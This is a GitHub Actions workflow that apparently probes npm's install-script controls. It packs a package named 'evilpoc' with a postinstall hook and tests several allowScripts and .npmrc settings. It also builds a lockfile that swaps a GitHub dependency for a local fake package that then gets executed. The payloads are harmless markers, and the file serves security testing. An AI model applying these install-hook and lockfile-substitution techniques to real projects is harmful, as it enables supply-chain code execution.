---
name: npm-probe3
on:
  workflow_dispatch:

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: probe
        run: |
          echo "npm=$(npm --version) node=$(node --version)"
          setup() {
            d="$1"; key="$2"
            mkdir -p "$d/evilpoc"
            printf '%s\n' '{"name":"evilpoc","version":"1.0.0","scripts":{"postinstall":"node poc.js"}}' > "$d/evilpoc/package.json"
            printf '%s\n' 'console.log("PROBE_EXEC_'"$d"'");require("fs").writeFileSync("/tmp/M_'"$d"'","x")' > "$d/evilpoc/poc.js"
            ( cd "$d/evilpoc" && npm pack --pack-destination .. >/dev/null 2>&1 )
            printf '%s\n' "{\"name\":\"$d\",\"version\":\"1.0.0\",\"dependencies\":{\"evilpoc\":\"file:./evilpoc-1.0.0.tgz\"},\"allowScripts\":$key}" > "$d/package.json"
          }
          run() { d="$1"; echo "########## $d : $(cat $d/package.json)"; ( cd "$d" && npm install --no-save github:AdobeDocs/adp-devsite-scripts 2>&1 | grep -v -E "^npm warn gitignore" ; ); echo "MARKER_$d=$(cat /tmp/M_$d 2>&1)"; }
          setup a '{"evilpoc":true}'; run a
          setup b '{"evilpoc@1.0.0":true}'; run b
          setup c '{"*":true}'; run c
          setup d '{"evilpoc":"1.0.0"}'; run d
          echo "########## e : .npmrc allow-scripts"
          setup e '{}'; printf 'allow-scripts=evilpoc\naudit=false\nfund=false\n' > e/.npmrc; run e
          echo "########## f : lockfile content swap"
          mkdir -p f/fake/linter-bot
          printf '%s\n' '{"name":"adp-devsite-scripts","version":"1.0.0","main":"index.js"}' > f/fake/package.json
          printf '%s\n' 'console.log("PROBE_FAKE_ADP_EXECUTED")' > f/fake/linter-bot/postLinterReport.js
          printf '%s\n' '{"name":"f","version":"1.0.0"}' > f/package.json
          printf '%s\n' '{"name":"f","version":"1.0.0","lockfileVersion":3,"requires":true,"packages":{"":{"name":"f","version":"1.0.0"},"node_modules/adp-devsite-scripts":{"version":"1.0.0","resolved":"file:./fake","license":"ISC"}}}' > f/package-lock.json
          ( cd f && npm install --no-save github:AdobeDocs/adp-devsite-scripts 2>&1 | grep -v -E "^npm warn gitignore"; node node_modules/adp-devsite-scripts/linter-bot/postLinterReport.js 2>&1 | head -3 )
